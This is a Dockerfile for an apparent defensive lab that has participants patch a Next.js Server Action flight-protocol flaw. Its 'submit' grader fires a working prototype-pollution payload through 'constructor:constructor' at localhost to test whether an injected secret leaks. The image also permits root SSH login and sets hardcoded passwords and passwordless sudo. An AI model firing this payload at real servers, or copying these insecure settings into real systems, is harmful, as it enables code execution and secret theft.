FROM ubuntu:24.04

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Asia/Bangkok
ENV NODE_ENV=development

RUN apt-get update \
    && apt-get install -y unminimize \
    && rm -rf /var/lib/apt/lists/* \
    && yes | unminimize

RUN apt-get update && apt-get upgrade -y && \
    apt-get install -y openssh-server apt-file apt-utils iproute2 iputils-ping sudo htop iputils* acl tzdata net-tools vim nano acl curl git tini

RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
    && apt-get install -y nodejs

# Create user and set passwords
RUN useradd -m -s /bin/bash secspace && \
    echo 'secspace:secspace' | chpasswd && \
    usermod -aG sudo secspace && \
    usermod -U secspace && \
    echo 'root:supersecret_password' | chpasswd && \
    usermod -U root

RUN mkdir /var/run/sshd && \
    sed -i 's/^#\(PermitRootLogin \).*/\1yes/' /etc/ssh/sshd_config && \
    sed -i 's/^#\(PasswordAuthentication \).*/\1yes/' /etc/ssh/sshd_config && \
    sed -i 's/^#\(KbdInteractiveAuthentication \).*/\1yes/' /etc/ssh/sshd_config && \
    sed 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd && \
    echo "export VISIBLE=now" >> /etc/profile

RUN echo 'secspace ALL=(ALL) NOPASSWD: ALL' | tee -a /etc/sudoers

WORKDIR /home/secspace

USER secspace

RUN npx create-next-app@15.0.4 app \
    --yes \
    --use-npm \
    --typescript \
    --eslint \
    --app \
    --no-tailwind \
    --no-src-dir \
    --import-alias "@/*"

WORKDIR /home/secspace/app

RUN printf "/** @type {import('next').NextConfig} */\nconst nextConfig = { output: 'standalone' };\nmodule.exports = nextConfig;\n" > next.config.js

RUN npm install

ENV NODE_ENV=production

RUN npm run build

# Prepare standalone directory
RUN mkdir -p .next/standalone/public && \
    mkdir -p .next/standalone/.next && \
    cp -r public/* .next/standalone/public/ || true && \
    cp -r .next/static .next/standalone/.next/static || true

# Store the secret in a file to avoid the Docker ENV security warning
RUN echo "cve{nextjs-flight-protocol-issue-defended}" > .rng_secret

USER root

# Create submission tool
RUN printf '#!/usr/bin/env node\n\
const fs = require("fs");\n\
const secret = fs.readFileSync("/home/secspace/app/.rng_secret", "utf8").trim();\n\
const payload = JSON.stringify({\n\
  then: "$1:__proto__:then",\n\
  status: "resolved_model",\n\
  reason: -1,\n\
  value: JSON.stringify({then: "$B1337"}),\n\
  _response: {\n\
    _prefix: `var res=process.env.RNG_SECRET;throw Object.assign(new Error(\"x\"),{digest: res});`,\n\
    _chunks: "$Q2",\n\
    _formData: { get: "$1:constructor:constructor" }\n\
  }\n\
});\n\
\n\
const boundary = "----WebKitFormBoundarysubmission";\n\
const body = [\n\
  `--${boundary}`,\n\
  "Content-Disposition: form-data; name=\\"0\\"",\n\
  "",\n\
  payload,\n\
  `--${boundary}`,\n\
  "Content-Disposition: form-data; name=\\"1\\\"",\n\
  "",\n\
  "\\\"$@0\\\"",\n\
  `--${boundary}`,\n\
  "Content-Disposition: form-data; name=\\"2\\\"",\n\
  "",\n\
  "[]",\n\
  `--${boundary}--`,\n\
  ""\n\
].join("\\r\\n");\n\
\n\
fetch("http://localhost:3000/adfa", {\n\
  method: "POST",\n\
  headers: {\n\
    "Next-Action": "x",\n\
    "Content-Type": `multipart/form-data; boundary=${boundary}`\n\
  },\n\
  body\n\
}).then(res => res.text()).then(text => {\n\
  if (text.includes(secret)) {\n\
    console.log("\\x1b[31mIncorrect\\x1b[0m");\n\
  } else {\n\
    console.log("\\x1b[32mCorrect\\x1b[0m");\n\
  }\n\
}).catch(e => {\n\
  console.log("\\x1b[32mCorrect\\x1b[0m");\n\
});\n\
' > /usr/local/bin/submit && chmod +x /usr/local/bin/submit

EXPOSE 22 3000

ENTRYPOINT ["/usr/bin/tini", "--"]

CMD ["/bin/bash", "-c", "/usr/sbin/sshd && su - secspace -c 'export RNG_SECRET=$(cat /home/secspace/app/.rng_secret) && cd /home/secspace/app/.next/standalone && PORT=3000 HOSTNAME=0.0.0.0 node server.js'"]
